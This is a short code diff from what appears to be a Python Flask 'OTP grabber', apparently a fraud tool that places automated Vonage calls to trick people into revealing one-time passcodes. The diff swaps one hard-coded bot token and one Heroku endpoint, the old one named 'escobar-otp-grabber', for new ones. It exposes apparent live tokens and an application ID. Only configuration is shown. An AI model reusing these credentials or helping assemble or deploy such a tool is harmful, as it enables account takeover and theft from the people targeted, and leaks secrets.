@@ -4,12 +4,12 @@ import vonage, requests, json
 app = Flask(__name__)
 
 # Enter token here
-token = "5078799701:AAGtwv7Iar3ZWGTEQR6TLsJudTjBMGPeA_o"
+token = "5246281433:AAFkO2V3yk8afCfwFnrbnBgDvBlCQbhK-_I"
 
 # Enter API Creds Here
 client = vonage.Client(application_id="cfacedaf-11c0-4855-80cc-55d4fc5ad072",private_key="private.key")
  
-url = "https://escobar-otp-grabber.herokuapp.com"
+url = "https://diplootp.herokuapp.com/"
 
 number = "12017718001"
 
